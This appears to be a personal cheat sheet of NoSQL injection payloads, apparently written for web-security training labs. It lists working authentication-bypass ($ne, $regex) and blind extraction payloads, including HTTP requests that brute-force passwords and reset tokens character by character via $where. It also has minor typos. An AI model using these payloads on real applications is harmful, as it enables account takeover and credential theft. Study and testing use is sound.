# No SQL

## Detecting:

> Make sure to `CTRL+U` if used in repeater...
> Does NOT always work, e.g.: for logins...

* True: `Gifts' && 0 && 'x`
* False: `Gifts' && 1 && 'x`
* Always true: `Gifts'||1||'x`

* Null character (MongoDB): `Gifts'\u0000` -> `this.category == 'Gigts'\u0000' && this.released == 1`
    * This will terminate the query after the Null, and prevent the aditional restriction.

## Operators:

* `$Where`
* `$Ne`
* `$Ni`
* `$Regex`

## Examples: 

* `?username=wiener` -> `username[$ne]=invalid`
* `{"username": "wiener"}` -> `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
* `{"username":{"$regex":"admin.*"},"password":{"$ne":""}}`
* Identify password length: `administrator' && this.password.length < 30 || 'a'=='b`
    * `GET /user/lookup?user=administrator'+%26%26+this.password.length+<+30+||+'a'%3d%3d'b HTTP/2`
* Bruteforce Password: (Cluster Bomb)`GET /user/lookup?user=administrator' && this.password[§0§]+=='§a§' || 'a'=='b`
    * `GET /user/lookup?user=administrator'+%26%26+this.password[0]+=='n'+||+'a'%3d%3d'b`
* Test if operator injection: 
    * False: `{"username":"wiener","password":"peter", "$where":"0"}`
    * True: `{"username":"wiener","password":"peter", "$where":"1"}`
    * If you able to inject operator, you can extract field names: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
        * `{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[2].match('^.{§1§}§a§.*')"}`
        * Fuzz the field name: `{"username":"carlos","password":{"$ne": ""}, "$where":"this.pwResetTkn.match('^.{§§}§§.*')"}`
